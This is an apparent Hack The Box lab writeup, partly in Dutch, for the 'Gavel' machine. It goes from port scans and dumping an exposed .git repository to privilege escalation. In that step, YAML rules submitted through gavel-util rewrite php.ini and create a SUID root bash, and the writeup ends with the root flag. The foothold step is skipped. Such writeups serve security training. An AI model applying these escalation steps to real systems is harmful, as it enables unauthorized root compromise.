# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~]
└─$ nmap 10.129.147.164             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 17:11 CET
Nmap scan report for 10.129.147.164
Host is up (0.023s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~]
└─$ nmap -p22,80 -sCV 10.129.147.164
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 17:12 CET
Nmap scan report for gavel.htb (10.129.147.164)
Host is up (0.020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
|_  256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Gavel Auction
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-git: 
|   10.129.147.164:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: .. 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Hierboven kunnen we zien dat er een .git subdirectory is. Ik zal deze gaan afhalen door de GitHacker tool te gebruiken.

```
┌──(kali㉿kali)-[~/HTB/Gavel/GitHacker]
└─$ githacker --url http://gavel.htb/.git/ --output-folder result_gavel 
2025-12-01 17:19:49 INFO 1 urls to be exploited
2025-12-01 17:19:49 INFO Exploiting http://gavel.htb/.git/ into result_gavel/655fb9718d8950231d822e5e75498554
2025-12-01 17:19:49 INFO Directory listing enable under: apache
```

zoals je binnen de config.php file kunt zien is er interessante informatie te vinden over een database. We zullen deze waarschijnlijk straks nodig hebben.

```
┌──(kali㉿kali)-[~/…/Gavel/GitHacker/result_gavel/655fb9718d8950231d822e5e75498554]
└─$ cat includes/config.php 
<?php

define('DB_HOST', 'localhost');
define('DB_NAME', 'gavel');
define('DB_USER', 'gavel');
define('DB_PASS', 'gavel');

define('ROOT_PATH', dirname(__DIR__));

$basePath = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
define('BASE_URL', $basePath);
define('ASSETS_URL', $basePath . '/assets');
```

Als je naar de webpagina gaat en daar naar de .git subdirectory ben ik op de volgende informatie gekomen.

```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
	name = sado
	email = sado@gavel.htb
```

binnen de admin.php file kunnen we zien dat er een user `auctioneer` is

```
┌──(kali㉿kali)-[~/…/Gavel/GitHacker/result_gavel/655fb9718d8950231d822e5e75498554]
└─$ cat admin.php 
<?php
require_once __DIR__ . '/includes/config.php';
require_once __DIR__ . '/includes/db.php';
require_once __DIR__ . '/includes/session.php';
require_once __DIR__ . '/includes/auction.php';

if (!isset($_SESSION['user']) || $_SESSION['user']['role'] !== 'auctioneer') {
    header('Location: index.php');
    exit;
}
```

```
auctioneer@gavel:/var/www/html/gavel/includes$ ls -la /opt/gavel/
ls -la /opt/gavel/
total 56
drwxr-xr-x 4 root root  4096 Nov  5 12:46 .
drwxr-xr-x 3 root root  4096 Nov  5 12:46 ..
drwxr-xr-x 3 root root  4096 Nov  5 12:46 .config
-rwxr-xr-- 1 root root 35992 Oct  3 19:35 gaveld
-rw-r--r-- 1 root root   364 Sep 20 14:54 sample.yaml
drwxr-x--- 2 root root  4096 Nov  5 12:46 submission
```

```
auctioneer@gavel:~$  echo 'name: fixini' > fix_ini.yaml
 echo 'name: fixini' > fix_ini.yaml
auctioneer@gavel:~$ echo 'description: fix php ini' >> fix_ini.yaml
echo 'description: fix php ini' >> fix_ini.yaml
auctioneer@gavel:~$ echo 'image: "x.png"' >> fix_ini.yaml
echo 'image: "x.png"' >> fix_ini.yaml
auctioneer@gavel:~$ echo 'price: 1' >> fix_ini.yaml
echo 'price: 1' >> fix_ini.yaml
auctioneer@gavel:~$ echo 'rule_msg: "fixini"' >> fix_ini.yaml
echo 'rule_msg: "fixini"' >> fix_ini.yaml
auctioneer@gavel:~$ echo "rule: file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\\ndisplay_errors=On\\nopen_basedir=\\ndisable_functions=\\n\"); return false;" >> fix_ini.yaml
<le_functions=\\n\"); return false;" >> fix_ini.yaml
auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/fix_ini.yaml
<bin/gavel-util submit /home/auctioneer/fix_ini.yaml
```

```
auctioneer@gavel:~$ echo 'name: rootshell' > rootshell.yaml
echo 'name: rootshell' > rootshell.yaml
auctioneer@gavel:~$ echo 'description: make suid bash' >> rootshell.yaml
echo 'description: make suid bash' >> rootshell.yaml
auctioneer@gavel:~$ echo 'image: "x.png"' >> rootshell.yaml
echo 'image: "x.png"' >> rootshell.yaml
auctioneer@gavel:~$ echo 'price: 1' >> rootshell.yaml
echo 'price: 1' >> rootshell.yaml
auctioneer@gavel:~$ echo 'rule_msg: "rootshell"' >> rootshell.yaml
echo 'rule_msg: "rootshell"' >> rootshell.yaml
auctioneer@gavel:~$ echo "rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;" >> rootshell.yaml
</gavel/rootbash'); return false;" >> rootshell.yaml
auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/rootshell.yaml
<n/gavel-util submit /home/auctioneer/rootshell.yaml
```


Root Flag: c516af0ad1d4d5bab2f436086c1212e6

```
rootbash-5.1# cat /root/root.txt
cat /root/root.txt
c516af0ad1d4d5bab2f436086c1212e6
```

Rooted

![[Pasted image 20251209195300.png]]